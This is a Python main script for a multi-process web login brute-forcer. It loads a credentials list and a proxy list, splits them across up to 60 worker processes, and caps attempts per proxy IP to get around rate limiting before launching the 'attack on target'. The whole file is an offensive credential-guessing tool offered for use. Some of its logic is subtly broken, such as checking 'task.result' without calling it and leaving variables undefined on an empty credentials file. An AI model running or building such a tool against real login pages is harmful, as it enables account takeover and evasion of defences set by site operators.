import argparse
import sys
import os
import logging
from Bruteforcer import Bruteforcer
from urllib.error import HTTPError, URLError
from concurrent.futures import ProcessPoolExecutor
from packages.logger import Logger
from packages.utils import (
    collect_input_args,
    validate_input_args,
    parse_url,
    parse_headers,
    parse_data_scheme,
    split_file_for_processes,
    ask_for_continue_without_proxy,
    open_file_as_list,
    find_separator,
)


parser = argparse.ArgumentParser()
args = collect_input_args(parser)
LOGFILE = "log/app.log"
LOGFILE_COUNT = 7
LOGGING_FILE = True if os.getenv("LOGGING_FILE", "false").lower() == "true" else False
LOGGING_STD = True if os.getenv("LOGGING_STD", "true").lower() == "true" else False
LOGGING_LEVEL = logging.DEBUG if args.verbose > 0 else logging.INFO
logger = (
    Logger()
    .Init(
        loggerType="std",
        loggerInit=LOGGING_STD,
        level=LOGGING_LEVEL,
        formatterName="formater",
    )
    .Init(
        loggerType="file",
        loggerInit=LOGGING_FILE,
        logFile=LOGFILE,
        logFileCount=LOGFILE_COUNT,
    )
    .Get()
)


def create_process_pool():
    executor = ProcessPoolExecutor(max_workers=60)
    return executor


def main():
    logger.debug("Logger created correctly")
    logger.debug(f"Program started with `{args.processes}` processes ")
    logger.debug(f"Parsing url `{args.url}` started")
    host = parse_url(args.url)
    logger.debug(f"Parsing url `{args.url}` finished correctly")
    headers = []
    if args.headers:
        logger.debug(f"Parsing file `{args.headers}` started")
        headers = parse_headers(args.headers)
        logger.debug(f"Parsing file `{args.headers}` finished correctly")
    logger.debug(f"Parsing file `{args.data_scheme}` started")
    data_scheme = parse_data_scheme(args.data_scheme)
    logger.debug(f"Parsing file `{args.data_scheme}` finished correctly")
    logger.debug(f"Parsing file `{args.credentials_file}` started")
    credentials_list = open_file_as_list(args.credentials_file)
    if credentials_list:
        current_separator = find_separator(credentials_list, args.credentials_file)
        if not current_separator:
            logger.info(f"No separator found in `{args.credentials_file}`")
        all_credentials = split_file_for_processes(credentials_list, args.processes)
        logger.debug(f"Parsing file `{args.credentials_file}` finished correctly")
    else:
        logger.error(f"File `{args.credentials_file}` is empty")
        # dupa tutaj zesrać
    if args.proxies:
        logger.debug(f"Parsing file `{args.proxies}` started")
        proxies_list = open_file_as_list(args.proxies)
        if not proxies_list and not ask_for_continue_without_proxy():
            logger.info("Bye!")
            sys.exit(0)
        all_proxies = split_file_for_processes(proxies_list, args.processes)
        logger.debug(f"Parsing file `{args.proxies}` finished correctly")
    else:
        all_proxies = [[] * process for process in range(args.processes)]

    process_executor = create_process_pool()
    bruteforce_tools = []
    for process in range(args.processes):
        logger.debug(f"Creating bruteforcer object number `{process+1}`")
        bruteforce_tools.append(
            Bruteforcer(
                args.url,
                host,
                headers,
                data_scheme,
                args.data_scheme,
                all_credentials[process],
                current_separator,
                args.fail_url,
                all_proxies[process],
                args.attemps_per_ip,
                process + 1,
            )
        )
        task = process_executor.submit(bruteforce_tools[process].perform_bruteforce)
        # bruteforce_tools[process].perform_bruteforce()
    logger.debug(f"Attack on target `{args.url}` started")
    process_executor.shutdown(wait=True)
    if task.result:
        logger.debug(f"Attack on target `{args.url}` finished")


if __name__ == "__main__":
    validate_input_args(args)
    try:
        main()
    except KeyboardInterrupt:
        logger.warning("Interrupted by user")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
    except URLError as e:
        logger.error(f"Exception `{e}`. Incorrect url: `{args.url}`")
    except Exception as e:
        logger.error(f"Exception `{e}`")
